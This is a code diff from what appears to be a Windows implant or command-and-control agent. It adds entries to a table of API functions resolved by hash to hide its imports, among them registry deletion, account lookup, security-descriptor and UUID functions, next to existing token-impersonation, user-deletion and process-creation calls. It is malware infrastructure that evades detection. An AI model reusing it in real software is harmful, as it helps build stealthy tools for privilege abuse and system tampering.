@@ -181,8 +181,8 @@ namespace Procs
         pProcs->lpFindFirstFileW                = reinterpret_cast<LPPROC_FINDFIRSTFILEW>(pFindFirstFileW);
         PVOID pFindNextFileW                    = GetProcAddressByHash(hKernel32, HASH_FUNC_FINDNEXTFILEW);
         pProcs->lpFindNextFileW                 = reinterpret_cast<LPPROC_FINDNEXTFILEW>(pFindNextFileW);
-        PVOID pFormatMessage                    = GetProcAddressByHash(hKernel32, HASH_FUNC_FORMATMESSAGE);
-        pProcs->lpFormatMessage                 = reinterpret_cast<LPPROC_FORMATMESSAGE>(pFormatMessage);
+        PVOID pFormatMessageW                   = GetProcAddressByHash(hKernel32, HASH_FUNC_FORMATMESSAGEW);
+        pProcs->lpFormatMessageW                = reinterpret_cast<LPPROC_FORMATMESSAGEW>(pFormatMessageW);
         PVOID pFreeLibrary                      = GetProcAddressByHash(hKernel32, HASH_FUNC_FREELIBRARY);
         pProcs->lpFreeLibrary                   = reinterpret_cast<LPPROC_FREELIBRARY>(pFreeLibrary);
         PVOID pGetComputerNameW                 = GetProcAddressByHash(hKernel32, HASH_FUNC_GETCOMPUTERNAMEW);
@@ -327,6 +327,7 @@ namespace Procs
         HMODULE hDbghelp,
         HMODULE hIphlpapi,
         HMODULE hNetapi32,
+        HMODULE hRpcrt4,
         HMODULE hShell32,
         HMODULE hUser32,
         HMODULE hWinHttp,
@@ -335,6 +336,8 @@ namespace Procs
         // Advapi32
         PVOID pAdjustTokenPrivileges            = GetProcAddressByHash(hAdvapi32, HASH_FUNC_ADJUSTTOKENPRIVILEGES);
         pProcs->lpAdjustTokenPrivileges         = reinterpret_cast<LPPROC_ADJUSTTOKENPRIVILEGES>(pAdjustTokenPrivileges);
+        PVOID pConvertStringSecurityDescriptorToSecurityDescriptorW     = GetProcAddressByHash(hAdvapi32, HASH_FUNC_CONVERTSTRINGSECURITYDESCRIPTORTOSECURITYDESCRIPTORW);
+        pProcs->lpConvertStringSecurityDescriptorToSecurityDescriptorW  = reinterpret_cast<LPPROC_CONVERTSTRINGSECURITYDESCRIPTORTOSECURITYDESCRIPTORW>(pConvertStringSecurityDescriptorToSecurityDescriptorW);
         PVOID pCreateProcessWithTokenW          = GetProcAddressByHash(hAdvapi32, HASH_FUNC_CREATEPROCESSWITHTOKENW);
         pProcs->lpCreateProcessWithTokenW       = reinterpret_cast<LPPROC_CREATEPROCESSWITHTOKENW>(pCreateProcessWithTokenW);
         PVOID pDuplicateTokenEx                 = GetProcAddressByHash(hAdvapi32, HASH_FUNC_DUPLICATETOKENEX);
@@ -345,6 +348,8 @@ namespace Procs
         pProcs->lpGetUserNameW                  = reinterpret_cast<LPPROC_GETUSERNAMEW>(pGetUserNameW);
         PVOID pImpersonateLoggedOnUser          = GetProcAddressByHash(hAdvapi32, HASH_FUNC_IMPERSONATELOGGEDONUSER);
         pProcs->lpImpersonateLoggedOnUser       = reinterpret_cast<LPPROC_IMPERSONATELOGGEDONUSER>(pImpersonateLoggedOnUser);
+        PVOID pLookupAccountNameW               = GetProcAddressByHash(hAdvapi32, HASH_FUNC_LOOKUPACCOUNTNAMEW);
+        pProcs->lpLookupAccountNameW            = reinterpret_cast<LPPROC_LOOKUPACCOUTNAMEW>(pLookupAccountNameW);
         PVOID pLookupPrivilegeNameW             = GetProcAddressByHash(hAdvapi32, HASH_FUNC_LOOKUPPRIVILEGENAMEW);
         pProcs->lpLookupPrivilegeNameW          = reinterpret_cast<LPPROC_LOOKUPPRIVILEGENAMEW>(pLookupPrivilegeNameW);
         PVOID pLookupPrivilegeValueW            = GetProcAddressByHash(hAdvapi32, HASH_FUNC_LOOKUPPRIVILEGEVALUEW);
@@ -357,6 +362,10 @@ namespace Procs
         pProcs->lpRegCloseKey                   = reinterpret_cast<LPPROC_REGCLOSEKEY>(pRegCloseKey);
         PVOID pRegCreateKeyExW                  = GetProcAddressByHash(hAdvapi32, HASH_FUNC_REGCREATEKEYEXW);
         pProcs->lpRegCreateKeyExW               = reinterpret_cast<LPPROC_REGCREATEKEYEXW>(pRegCreateKeyExW);
+        PVOID pRegDeleteKeyExW                  = GetProcAddressByHash(hAdvapi32, HASH_FUNC_REGDELETEKEYEXW);
+        pProcs->lpRegDeleteKeyExW               = reinterpret_cast<LPPROC_REGDELETEKEYEXW>(pRegDeleteKeyExW);
+        PVOID pRegDeleteValueW                  = GetProcAddressByHash(hAdvapi32, HASH_FUNC_REGDELETEVALUEW);
+        pProcs->lpRegDeleteValueW               = reinterpret_cast<LPPROC_REGDELETEVALUEW>(pRegDeleteValueW);
         PVOID pRegEnumKeyExW                    = GetProcAddressByHash(hAdvapi32, HASH_FUNC_REGENUMKEYEXW);
         pProcs->lpRegEnumKeyExW                 = reinterpret_cast<LPPROC_REGENUMKEYEXW>(pRegEnumKeyExW);
         PVOID pRegEnumValueW                    = GetProcAddressByHash(hAdvapi32, HASH_FUNC_REGENUMVALUEW);
@@ -421,6 +430,14 @@ namespace Procs
         pProcs->lpNetUserDel                    = reinterpret_cast<LPPROC_NETUSERDEL>(pNetUserDel);
         PVOID pNetUserEnum                      = GetProcAddressByHash(hNetapi32, HASH_FUNC_NETUSERENUM);
         pProcs->lpNetUserEnum                   = reinterpret_cast<LPPROC_NETUSERENUM>(pNetUserEnum);
+
+        // Rpcrt4
+        PVOID pRpcStringFreeW                   = GetProcAddressByHash(hRpcrt4, HASH_FUNC_RPCSTRINGFREEW);
+        pProcs->lpRpcStringFreeW                = reinterpret_cast<LPPROC_RPCSTRINGFREEW>(pRpcStringFreeW);
+        PVOID pUuidCreate                       = GetProcAddressByHash(hRpcrt4, HASH_FUNC_UUIDCREATE);
+        pProcs->lpUuidCreate                    = reinterpret_cast<LPPROC_UUIDCREATE>(pUuidCreate);
+        PVOID pUuidToStringW                    = GetProcAddressByHash(hRpcrt4, HASH_FUNC_UUIDTOSTRINGW);
+        pProcs->lpUuidToStringW                 = reinterpret_cast<LPPROC_UUIDTOSTRINGW>(pUuidToStringW);
 
         // Shell32
         PVOID pShellExecuteExW                  = GetProcAddressByHash(hShell32, HASH_FUNC_SHELLEXECUTEEXW);
